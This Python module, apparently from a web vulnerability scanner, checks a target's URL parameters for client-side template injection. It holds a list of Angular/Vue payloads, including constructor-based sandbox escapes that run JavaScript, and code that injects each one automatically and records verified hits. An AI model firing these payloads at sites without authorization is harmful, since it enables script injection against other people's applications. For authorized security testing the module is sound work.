"""csti_injection — Client-Side Template Injection (Angular/Vue/React)"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.probe import Probe

# Angular/Vue/React payloads with unique markers
PAYLOADS = [
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("{{constructor.constructor('alert(1)')()}}", None),
    ("{{$eval.constructor('alert(1)')()}}", None),
    ("{{['constructor']['constructor']('alert(1)')()}}", None),
    ("<div ng-app>{{7*7}}</div>", "49"),
    ("<div ng-controller=x ng-init='$eval(\"7*7\")'></div>", None),
    ("{{_c.constructor('alert(1)')()}}", None),
    ("v-bind:href=javascript:alert(1)", None),
    ("{{a}}", None),  # baseline
]

MARKERS = ["49", "7777777"]


class CstiInjection:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"q": ["test"]}

        probe = Probe(session, logger)
        base = probe.baseline_probe(target)
        if not base:
            print("[csti] no baseline"); return {"findings": []}
        print(f"[csti] baseline: {base['code']} {base['len']}b")

        findings = []
        for name in params:
            print(f"\n[csti] param '{name}'")
            for p, expected in PAYLOADS:
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True)))
                r = probe.inject(url_fn, p, detect_markers=[expected] if expected else None)
                if not r["hit"]:
                    continue

                # Only count if expected result appears (49, 7777777)
                if expected:
                    if expected in r.get("response").text if r.get("response") is not None else False:
                        verified = probe.verify(url_fn, p, detect_markers=[expected], times=2)
                        if not verified:
                            continue
                        print(f"  ✓ [{expected}] {p[:50]}")
                        findings.append({"param": name, "payload": p,
                                         "result": expected, "severity": "high",
                                         "verified": True})
                        logger.finding("csti", "high", f"{name}={p[:50]} -> {expected}")
                else:
                    # if payload reflected raw in HTML — potential
                    if "{{" in p and p in (r.get("response").text if r.get("response") is not None else ""):
                        print(f"  [?] raw reflection: {p[:50]}")
                        findings.append({"param": name, "payload": p,
                                         "type": "raw_reflection", "severity": "medium"})

        print(f"\n[csti] total: {len(findings)}")
        return {"findings": findings, "stats": probe.summary()}
